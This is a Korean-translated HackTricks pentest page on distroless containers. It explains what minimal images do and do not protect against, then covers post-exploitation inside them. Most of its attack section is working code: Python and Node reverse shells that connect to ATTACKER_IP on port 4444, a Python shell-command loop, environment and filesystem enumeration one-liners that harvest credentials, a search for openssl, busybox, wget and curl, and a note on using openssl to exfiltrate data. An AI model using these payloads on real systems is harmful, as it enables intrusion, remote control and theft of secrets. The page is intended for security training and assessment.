# Distroless 컨테이너

{{#include ../../../banners/hacktricks-training.md}}

## 개요

A **distroless** 컨테이너 이미지는 하나의 특정 애플리케이션을 실행하는 데 필요한 **최소 런타임 구성요소만** 제공하면서 패키지 관리자, 쉘, 대량의 범용 유저랜드 유틸리티 같은 일반적인 배포 도구를 의도적으로 제거한 이미지입니다. 실제로 distroless 이미지에는 종종 애플리케이션 바이너리나 런타임, 공유 라이브러리, 인증서 번들, 아주 작은 파일시스템 레이아웃만 포함됩니다.

요점은 distroless가 새로운 커널 격리 프리미티브라는 것이 아니라는 것입니다. Distroless는 **이미지 디자인 전략**입니다. 그것은 커널이 컨테이너를 격리하는 방식이 아니라 컨테이너 파일시스템 **내부**에서 무엇이 제공되는지를 변경합니다. 이 차이는 중요합니다. distroless는 주로 공격자가 코드 실행을 획득한 후 사용할 수 있는 것을 줄여 환경을 강화하기 때문입니다. 그것은 namespaces, seccomp, capabilities, AppArmor, SELinux 또는 다른 어떤 런타임 격리 메커니즘을 대체하지 않습니다.

## Distroless가 존재하는 이유

Distroless 이미지는 주로 다음을 줄이기 위해 사용됩니다:

- 이미지 크기
- 이미지 운영 복잡성
- 취약점을 포함할 수 있는 패키지 및 바이너리 수
- 기본적으로 공격자가 사용할 수 있는 post-exploitation 도구 수

이것이 distroless 이미지가 프로덕션 애플리케이션 배포에서 인기 있는 이유입니다. 쉘도 없고 패키지 관리자도 없으며 거의 범용 툴링이 없는 컨테이너는 운영 측면에서 보통 더 단순하게 이해할 수 있고 침해 후 상호작용적으로 악용하기 더 어렵습니다.

잘 알려진 distroless 스타일 이미지 계열의 예:

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless가 의미하지 않는 것

Distroless 컨테이너는 다음이 아니다:

- 자동으로 rootless
- 자동으로 non-privileged
- 자동으로 read-only
- 자동으로 seccomp, AppArmor, 또는 SELinux로 보호되는 것
- 자동으로 container escape로부터 안전한 것

여전히 distroless 이미지를 `--privileged`, host namespace sharing, 위험한 bind mounts, 또는 mounted runtime socket과 함께 실행할 수 있습니다. 그런 경우 이미지는 최소화되어 있을 수 있지만 컨테이너는 여전히 치명적으로 불안정할 수 있습니다. Distroless는 **userland attack surface**를 변경할 뿐, **kernel trust boundary**를 변경하지 않습니다.

## 전형적인 운영 특성

distroless 컨테이너를 침해하면 가장 먼저 느끼는 것은 일반적인 가정들이 더 이상 성립하지 않는다는 것입니다. `sh`, `bash`, `ls`, `id`, `cat`이 없을 수 있고, 때로는 평소 사용하는 트레이드크래프트가 기대하는 방식으로 동작하는 libc 기반 환경조차 없을 수 있습니다. 이는 공격과 방어 모두에 영향을 미치는데, 툴이 부족하면 디버깅, 사고 대응, post-exploitation이 달라지기 때문입니다.

가장 흔한 패턴은:

- 애플리케이션 런타임은 존재하지만 그 외에는 거의 없음
- 쉘 기반 페이로드는 쉘이 없어서 실패함
- 헬퍼 바이너리가 없어서 일반적인 열거용 원라이너가 실패함
- read-only rootfs나 쓰기 가능한 tmpfs 위치에서의 `noexec` 같은 파일시스템 보호도 종종 존재

이 조합이 보통 사람들이 "weaponizing distroless"에 대해 이야기하게 만드는 이유입니다.

## Distroless와 Post-Exploitation

distroless 환경에서 주요 공격 과제는 항상 초기 RCE만은 아닙니다. 종종 문제가 되는 것은 그 다음 단계입니다. 만약 악용된 워크로드가 Python, Node.js, Java, 또는 Go 같은 언어 런타임에서 코드 실행을 허용한다면 임의의 로직을 실행할 수 있을 가능성은 있지만, 다른 Linux 대상에서 흔한 셸 중심 워크플로를 통해서가 아닐 수 있습니다.

그렇기 때문에 post-exploitation은 종종 다음 세 방향 중 하나로 전환됩니다:

1. **기존 언어 런타임을 직접 사용**하여 환경을 열거하고, 소켓을 열고, 파일을 읽거나 추가 페이로드를 스테이징한다.
2. **자체 툴을 메모리로 들여와 실행**한다 — 파일시스템이 read-only이거나 쓰기 가능한 위치가 `noexec`로 마운트된 경우.
3. **이미 이미지에 존재하는 바이너리를 악용**한다 — 애플리케이션이나 그 의존성이 예기치 않게 유용한 것을 포함하는 경우.

## 악용

### 이미 가진 런타임 열거하기

많은 distroless 컨테이너에는 쉘이 없지만 애플리케이션 런타임은 여전히 존재합니다. 대상이 Python 서비스라면 Python이 있고, 대상이 Node.js라면 Node가 있습니다. 이는 종종 파일을 열거하고, 환경 변수를 읽고, reverse shells를 열고, `/bin/sh`를 호출하지 않고도 메모리 내 실행을 스테이징할 수 있는 충분한 기능을 제공합니다.

Python을 이용한 간단한 예:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.js를 사용한 간단한 예:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
영향:

- 환경 변수 복구(종종 자격 증명 또는 서비스 엔드포인트 포함)
- `/bin/ls` 없이 파일시스템 열거
- 쓰기 가능한 경로 및 마운트된 시크릿 식별

### Reverse Shell Without `/bin/sh`

이미지에 `sh` 또는 `bash`가 포함되어 있지 않으면 기존의 shell 기반 reverse shell은 즉시 실패할 수 있습니다. 이 경우 설치된 언어 runtime을 대신 사용하세요.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
`/bin/sh`가 존재하지 않으면, 마지막 줄을 직접 Python으로 명령을 실행하도록 하거나 Python REPL 루프로 바꾸세요.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
다시 말해, `/bin/sh`가 없으면 shell을 새로 띄우는 대신 Node의 filesystem, process, networking API를 직접 사용하세요.

### 전체 예시: No-Shell Python 명령 루프

이미지에 Python이 있지만 shell이 전혀 없다면, 간단한 대화형 루프만으로도 완전한 post-exploitation 기능을 유지하기에 충분한 경우가 많습니다:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
이는 대화형 셸 바이너리를 필요로 하지 않는다. 공격자 관점에서 영향은 기본 셸과 사실상 동일하다: 명령 실행, enumeration, 그리고 기존 런타임을 통한 추가 페이로드의 staging.

### 인메모리 도구 실행

Distroless images는 종종 다음과 함께 결합된다:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

이 조합은 고전적인 "download binary to disk and run it" 워크플로를 신뢰할 수 없게 만든다. 그런 경우 메모리 실행 기법이 주요 해법이 된다.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### 이미지에 이미 포함된 바이너리

Some distroless images still contain operationally necessary binaries that become useful after compromise. A repeatedly observed example is `openssl`, because applications sometimes need it for crypto- or TLS-related tasks.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
If `openssl`이 존재한다면, 다음 용도로 사용될 수 있습니다:

- 아웃바운드 TLS 연결
- 허용된 egress 채널을 통한 data exfiltration
- encoded/encrypted blobs를 통한 payload 데이터 스테이징

정확한 악용 방법은 실제로 무엇이 설치되어 있는지에 따라 다르지만, 일반적인 요지는 distroless가 "전혀 도구가 없음(no tools whatsoever)"을 의미하는 것이 아니라, "일반 배포 이미지보다 훨씬 적은 도구만 포함되어 있음(far fewer tools than a normal distribution image)"을 의미한다는 점입니다.

## Checks

이 검사들의 목적은 이미지가 실무상 정말 distroless인지, 그리고 post-exploitation에 여전히 사용 가능한 런타임 또는 헬퍼 바이너리가 무엇인지 확인하는 것입니다.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
What is interesting here:

- 쉘이 없고 Python 또는 Node 같은 runtime이 존재할 경우, post-exploitation은 runtime-driven execution으로 전환해야 한다.
- 루트 파일시스템이 읽기 전용이고 `/dev/shm`는 쓰기 가능하지만 `noexec`인 경우, memory execution techniques가 훨씬 더 중요해진다.
- `openssl`, `busybox`, `java` 같은 helper binaries가 존재하면 추가 접근을 확보하는 데 필요한 기능을 제공할 수 있다.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

The key point is that distroless is an **이미지 속성**, not a runtime protection. Its value comes from reducing what is available inside the filesystem after compromise.

## Related Pages

For filesystem and memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

For container runtime, socket, and mount abuse that still applies to distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
